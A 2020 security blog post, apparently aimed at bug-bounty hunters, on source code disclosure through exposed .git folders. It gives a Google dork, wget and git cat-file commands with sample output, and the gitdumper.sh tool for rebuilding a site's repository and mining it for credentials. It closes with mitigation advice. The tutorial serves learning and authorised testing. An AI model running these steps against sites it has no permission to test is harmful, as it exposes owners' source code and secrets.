---
date: 2020-07-17 00:34:45
layout: post
title: "Insecure Source Code Management"
subtitle:
description: In this article, I will be explaining you the concept of a source code disclosure vulnerability and various risks associated with it.
image: /assets/img/uploads/source-code-disclosure/norris.png
optimized_image: /assets/img/uploads/source-code-disclosure/norris-optimized.png
category: exploitation
tags: source-code-disclosure bug-bounty
author: madhavmehndiratta
paginate: false
keywords: insecure source code management, source code disclosure, source code disclosure via .git folder, how to extract contents of .git folder, exploiting source code disclosure, infosec articles
---

## Introduction

When attacking a website, obtaining its source code can be extremely helpful for constructing an exploit. This is because many bugs, like SQL injections, are way easier to find using static code analysis as compared to black-box testing.
Obtaining a web application's source code also means getting a hold of all developer comments, hardcoded API keys, and all other sensitive data. So the source code of a web application should always be protected from public view. Many developers unknowingly upload the source code of their entire project to the internet, and this is where information leaks occur.

## Finding a .git Folder

<center><br><br>
<img src="/assets/img/uploads/source-code-disclosure/google-dork.png">
</center>
<br>
There are many ways by which you can find a .git folder. The most popular is by searching for the following Google Dork: 

`intitle:"Index of /.git"` 

If the directory listing is enabled, then you could directly browse the .git folder’s contents as shown in the image below.

<center><br><br>
<img src="/assets/img/uploads/source-code-disclosure/directory-listing.png">
</center>

Another way is brute forcing the directories using open source tools such as dirb or dirsearch. They both look for .git 		folder. If automated tools are not allowed, simply go to web-app/.git (e.g. https://example.com/.git) on a browser. If you get a 404 error, then .git/ doesn’t exist on the application. But in some cases if you get a 403 Forbidden error, then it does! but not directly accessible if directory listing is disabled on the server.

## Extracting the Files Manually

Once the existence of the Git folder is confirmed and directory listing is enabled, you can download it using wget by using:

```r
madhav@anton:~$ wget -r -np https://example.com/.git/
```

The next step is to locate the HEAD, and then extracting the master hash. Once you have the hash for the master branch, you can execute the following command: 

`git cat-file -p <master hash>` 

```r
madhav@anton:~/www.example.com/.git$ cat HEAD 
ref: refs/heads/master

madhav@anton:~/www.example.com/.git$ cat refs/heads/master 
1fae33780305157184cd5563dd7696d32be0d3c5

madhav@anton:~/www.example.com/.git$ git cat-file -p 1fae33780305157184cd5563dd7696d32be0d3c5
tree 546b9a0b104ec962ed4dce6154bf2022076cb9c9
parent 88e6c84c8dd8c38646772fb359866fcfcf8740e4
author Foo <example@gmail.com> 1583500079 +0100
committer GitHub <noreply@github.com> 1583500079 +0100
gpgsig -----BEGIN PGP SIGNATURE-----
 a9abJor19quHsI3ZWWcjOr0UnZ33sfIs8z0ITVV0O525j899LbmkIxLHmBnvgQ1y
 UeG5Js/OBaMBtv8j3Kbi4zzW+ETzvuqGGNSUXbv3OEEHRSaePkSQDiHwmpJAMCvC
 DmuFNwJpPL8T7hzX6jdM1r7i49KC70qooZKlx5+n9Y+0wHhSWWvEQmsJnl73oso9
 1wPYg3Qh+ImWvmOP2IDLuRG9qDd7uxd+Te09+CPnsjxF3n9lpbwlvJCievGY2DI=
 =lc27
 -----END PGP SIGNATURE-----

madhav@anton:~/www.example.com/.git$
```

This will give you the hash for the tree object which will lead you to the files of the project by executing the same command with the tree hash.

```r
madhav@anton:~/www.example.com/.git$ git cat-file -p 546b9a0b104ec962ed4dce6154bf2022076cb9c9
100755 blob 610cecd0bdab0faea045ef4f9bb861c862f7be03	LICENSE
100755 blob ec58df797c478eada515ea92bf3185ea6194edef	README.md
100644 blob 968a7233da85ea9edf0e56b223fe6ea1c6f1844e	cd.php
040000 tree 881998e68b54e759a8c06872aef8d5f4e9a08b39	css
100755 blob f4739221655f14501aa59da801d9708446bf01be	demo.php
100755 blob a5e1808b54ecf5119c4f8c2c3b868389f3fa6352	error.php
100755 blob 4061ddc0724b65ba54f6d1bbec4c4935e1f8649f	favicon.ico
040000 tree 979ce71e881e8e4fbf42da2cd547218f93daa4ea	font-awesome
040000 tree d8df5e7705085c10bffc38376394907b7514aa99	fonts
040000 tree 7a36fc98abdf572f629b85456e525242415dc76f	img
100755 blob f1c0edcfbd75ebad252dbeea4ab9c9df19712220	index.php
040000 tree bae3d0cfd5d74012d2fa35b9ccbfd74121d6f4d4	js
100755 blob 689d8cfad48fc2e0749ac0f2cb6786238d38287b	keybase.txt
040000 tree 444cc1c5c9c6a4bae757bc25adc9764f4a5a1485	less
100755 blob 2697029c1ba18340e044e6df68689548faed7a82	talks.php
madhav@anton:~/www.example.com/.git$
```
To extract the source code of the website into a compressed zip file, you can execute the following command:

```r
git archive --format zip --output "source.zip" <master-hash>
```

Now you will see a zip file named source.zip in the same directory. 

## Automating The Process

Browsing .git/ manually is good for proof of concept, but it is also a tedious job. If you want to retrieve as many files as possible, even with directory listing disabled, you can use the tool named <a href="https://github.com/internetwache/GitTools" rel=”nofollow”>GitTools.</a> 

```r
madhav@anton:~$ ./gitdumper.sh https://example.com/.git/ dest-dir/

git status          # To check the files that have changed
git checkout -- .   # To restore the files & download the directory
git log             # To see what other commits are there

```

Now you can analyze the local repository manually. Try to look for other vulnerabilities using static code analysis, or credentials, authentication tokens, new endpoints, etc.
## Conclusion

There are many famous websites which do not deny access to the .git/ folder therefore anyone can download their source code and possibly other sensitive data. This issue is not hard to detect and mitigate, so take a minute to make sure that your webserver isn’t misconfigured.

That’s it! I hope you understood the concept of source code disclosure vulnerability and the risk associated with it. Thanks for reading. Stay tuned for similar tutorials and much more coming up in the near future!
If you have any queries, you can contact me <a href="/contact">here.</a>

NOTE: The awesome artwork used in this article was created by <a href="https://dribbble.com/fabric8" rel=”nofollow”>Fabricio Rosa Marques.</a>